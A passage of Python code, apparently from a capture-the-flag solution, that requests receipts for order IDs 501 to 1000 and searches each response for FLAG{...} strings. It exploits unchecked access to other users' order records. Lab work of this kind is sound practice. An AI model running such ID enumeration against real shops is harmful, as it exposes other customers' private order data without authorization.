flags_found = []

for order_id in range(501, 1001):
    url = f"{base_url}/order/{order_id}/receipt"
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            flags_found.append((order_id, flag_match.group(0)))
